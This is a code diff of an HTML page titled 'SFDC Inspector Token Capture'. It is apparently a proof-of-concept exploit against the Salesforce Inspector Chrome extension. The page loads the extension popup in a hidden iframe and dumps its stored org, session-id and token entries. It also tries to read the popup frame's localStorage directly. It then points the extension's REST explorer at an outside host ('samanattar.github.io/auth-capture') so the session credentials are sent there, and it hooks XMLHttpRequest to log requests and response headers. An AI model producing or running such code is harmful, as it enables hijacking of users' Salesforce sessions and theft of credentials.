@@ -4,108 +4,117 @@
     <title>SFDC Inspector Token Capture</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        #requestInfo { background: #e3f2fd; padding: 15px; border-radius: 4px; margin-top: 20px; }
-        #storageInfo { background: #fff3cd; padding: 15px; border-radius: 4px; margin: 20px 0; }
+        .info-section { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
+        #networkLog { background: #e3f2fd; padding: 15px; border-radius: 4px; }
         .explorer-frame { width: 100%; height: 600px; border: 1px solid #ccc; margin-top: 20px; }
         pre { white-space: pre-wrap; }
     </style>
 </head>
 <body>
-    <div id="messages">Initializing...</div>
-    <div id="storageInfo"></div>
-    <div id="requestInfo"></div>
+    <div id="messages" class="info-section">Initializing...</div>
+    <div id="storageInfo" class="info-section"></div>
+    <div id="networkLog"></div>
     <script>
         const messagesDiv = document.getElementById('messages');
         const storageInfoDiv = document.getElementById('storageInfo');
-        const requestInfoDiv = document.getElementById('requestInfo');
+        const networkLogDiv = document.getElementById('networkLog');
         let initialized = false;
 
-        function displayStorage(storage) {
-            const entries = Object.entries(storage);
-            const orgEntries = entries.filter(([key]) => key.includes('org') || key.includes('sid') || key.includes('token'));
-            
-            storageInfoDiv.innerHTML = `
-                <h3>Storage Information:</h3>
-                <pre>${JSON.stringify(orgEntries, null, 2)}</pre>
-                
-                <h3>All Storage Keys:</h3>
-                <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
-            `;
-        }
-
+        // Add a timestamp cache parameter to force new request
         function createExplorerUrl() {
             const params = new URLSearchParams({
                 endpoint: '.samanattar.github.io/auth-capture',
                 method: 'GET',
                 format: 'json',
-                // Adding these to try to ensure headers are included
+                cache: Date.now(), // Add cache buster
                 contentType: 'application/json',
-                includeHeaders: 'true'
             });
             
-            const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
-            
-            requestInfoDiv.innerHTML += `
-                <h3>Explorer URL:</h3>
-                <pre>${url}</pre>
-            `;
-            
-            return url;
+            return `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
         }
+
+        // Monitor network requests
+        const originalXHR = window.XMLHttpRequest;
+        window.XMLHttpRequest = function() {
+            const xhr = new originalXHR();
+            const send = xhr.send;
+            const open = xhr.open;
+            
+            xhr.open = function() {
+                networkLogDiv.innerHTML += `
+                    <h3>Request Started:</h3>
+                    <pre>URL: ${arguments[1]}</pre>
+                    <pre>Method: ${arguments[0]}</pre>
+                `;
+                return open.apply(this, arguments);
+            };
+            
+            xhr.send = function() {
+                this.addEventListener('load', function() {
+                    networkLogDiv.innerHTML += `
+                        <h3>Request Completed:</h3>
+                        <pre>Status: ${this.status}</pre>
+                        <pre>Headers Sent: ${this.getAllResponseHeaders()}</pre>
+                    `;
+                });
+                return send.apply(this, arguments);
+            };
+            
+            return xhr;
+        };
 
         window.addEventListener('message', function(event) {
             // Log all messages for debugging
-            console.log('Message received:', event.origin, event.data);
+            console.log('Message received:', event);
             
-            // Ignore React DevTools messages
-            if (event.data.source?.includes('react-devtools')) {
-                return;
-            }
-
             if (event.data.insextInitRequest && !initialized) {
                 initialized = true;
                 const storage = event.data.iFrameLocalStorage || {};
                 
-                // Display storage info
-                displayStorage(storage);
+                // Try to access extension's localStorage directly through the popup frame
+                try {
+                    const popupFrame = document.querySelector('iframe[src*="popup.html"]');
+                    if (popupFrame && popupFrame.contentWindow) {
+                        const localStorage = popupFrame.contentWindow.localStorage;
+                        console.log('Direct localStorage access:', localStorage);
+                        
+                        storageInfoDiv.innerHTML += `
+                            <h3>Direct LocalStorage:</h3>
+                            <pre>${JSON.stringify(Array.from(localStorage), null, 2)}</pre>
+                        `;
+                    }
+                } catch (e) {
+                    console.log('Could not access direct localStorage:', e);
+                }
 
-                // Get org instances
-                const instances = Object.keys(storage)
-                    .filter(key => key.endsWith('_orgInstance'))
-                    .map(key => storage[key]);
-
+                // Display all received data
                 messagesDiv.innerHTML = `
-                    <h3>Initialization Data:</h3>
+                    <h3>Storage Keys:</h3>
+                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
+                    
+                    <h3>Full Initialization Data:</h3>
                     <pre>${JSON.stringify(event.data, null, 2)}</pre>
                 `;
 
-                if (instances.length > 0) {
-                    // Create and load the explorer frame
-                    const explorerFrame = document.createElement('iframe');
-                    explorerFrame.src = createExplorerUrl();
-                    explorerFrame.className = 'explorer-frame';
-                    document.body.appendChild(explorerFrame);
+                // Load explorer with cache-busting parameter
+                const explorerFrame = document.createElement('iframe');
+                explorerFrame.src = createExplorerUrl();
+                explorerFrame.className = 'explorer-frame';
+                document.body.appendChild(explorerFrame);
 
-                    // Add listener for messages from REST explorer
-                    window.addEventListener('message', function(explorerEvent) {
-                        if (explorerEvent.data.headers) {
-                            requestInfoDiv.innerHTML += `
-                                <h3>Request Headers:</h3>
-                                <pre>${JSON.stringify(explorerEvent.data.headers, null, 2)}</pre>
-                            `;
-                        }
-                    });
-                } else {
-                    messagesDiv.innerHTML += '<h3>No Salesforce orgs found. Please make sure you are logged in.</h3>';
-                }
+                // Monitor explorer frame messages
+                explorerFrame.addEventListener('load', () => {
+                    networkLogDiv.innerHTML += `
+                        <h3>Explorer Frame Loaded</h3>
+                        <pre>URL: ${explorerFrame.src}</pre>
+                    `;
+                });
             }
         });
 
-        // Load the extension popup in a hidden iframe for initialization
+        // Initialize the connection
+        console.log('Creating init frame');
         const initFrame = document.createElement('iframe');
-        initFrame.onload = () => console.log('Init frame loaded');
-        initFrame.onerror = (e) => console.error('Init frame error:', e);
         initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
         initFrame.style.display = 'none';
         document.body.appendChild(initFrame);
